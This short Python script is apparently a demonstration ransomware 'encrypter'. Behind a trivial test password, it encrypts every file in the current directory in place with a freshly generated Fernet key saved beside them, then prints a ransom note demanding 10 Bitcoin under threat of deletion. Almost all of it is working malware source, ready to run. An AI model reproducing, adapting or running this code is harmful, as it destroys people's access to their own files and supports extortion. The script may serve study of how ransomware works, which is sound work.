# Librairies
import os
from cryptography.fernet import Fernet

# Safeguard password for testing
safeguard = input("Please enter the safeguard password: ")
if safeguard != 'start':
    quit()

# Find all files from the machine

files = []

for file in os.listdir():
    if file == "encrypter.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

# Generate key
key = Fernet.generate_key()

with open("thekey.key","wb") as k:
    k.write(key)

for file in files:
    with open(file,"rb") as f:
        data = f.read()
    dataEncrypted = Fernet(key).encrypt(data)
    with open(file,"wb") as f:
        f.write(dataEncrypted)

print("All of your files have been encrypted !! Send me 10 Bitcoin or I will delete them in 24 hourss...")